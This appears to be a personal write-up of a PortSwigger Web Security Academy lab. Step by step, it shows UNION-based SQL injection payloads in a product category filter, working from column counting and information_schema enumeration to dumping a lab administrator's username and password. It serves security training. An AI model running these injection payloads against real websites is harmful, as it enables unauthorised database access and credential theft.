# Lab: SQL injection attack, listing the database contents on non-Oracle databases

- sqli: product category fillter
- end goal: log in as the administrator user

### Analysis

- url: `https://0a6d009903388d3c8012c10c00d400df.web-security-academy.net/`

- front-end: `/filter?category=Pets`
- back-end:
```sql
select * from product where category = 'Pets' and released = 1
```

- check sqli vulnerability
- front-end: `/filter?category=Pets'`
- back-end:
```sql
select * from product where category = 'Pets'' and released = 1
'-- 500 Internal Server Error
```

- front-end: `/filter?category=Pets'--`
- back-end:
```sql
select * from product where category = 'Pets'--' and released = 1
-- 200 OK: 
```

- determine how many columns are contain in this website
- front-end: `/filter?category=Pets' order by 2--`
- back-end:
```sql
select * from product where category = 'Pets' order by 2--' and released = 1
-- 200 OK: contain 2 columns
```

- determine data type that contain in the columns 
- front-end: `/filter?category=Pets' union select 'a', 'a'--`
- back-end:
```sql
select * from product where category = 'Pets'' union select 'a', 'a'-- and released = 1
'-- 200 OK: both columns are text
```

- display database version 
- front-end: `/filter?category=Pets' union select version(), null--`
- back-end:
```sql
select * from product where category = 'Pets'' union select version(), null-- and released = 1
'-- 200 OK: PostgreSQL database
-- PostgreSQL 12.18
```

- output the list of table name 
- front-end: `/filter?category=Pets' union select table_name, null from information_schema.tables--`
- back-end:
```sql
select * from product where category = 'Pets'' union select table_name, null from information_schema.tables--
'-- table name: users_lxjhlz 
```

- output the column name of the table 
- front-end: `/filter?category=Pets' union select column_name, null from information_schema.columns where table_name = 'users_lxjhlz'--`
- back-end:
```sql
select * from product where category = 'Pets'' union select column_name, null from information_schema.columns where table_name = 'users_lxjhlz'--
'-- column name: username_omgyxd
-- column name: password_vuesiv
```

- output usernames and passwords
- front-end: `/filter?category=Pets' union select username_omgyxd, password_vuesiv from users_lxjhlz--`
- back-end:
```sql
select * from product where category = 'Pets'' union select username_omgyxd, password_vuesiv from users_lxjhlz--
'-- username: administrator
-- password: fuc5hxlnt3ev1q29o72q
```

- login as administrator account
- Congratulations, you solved the lab!

---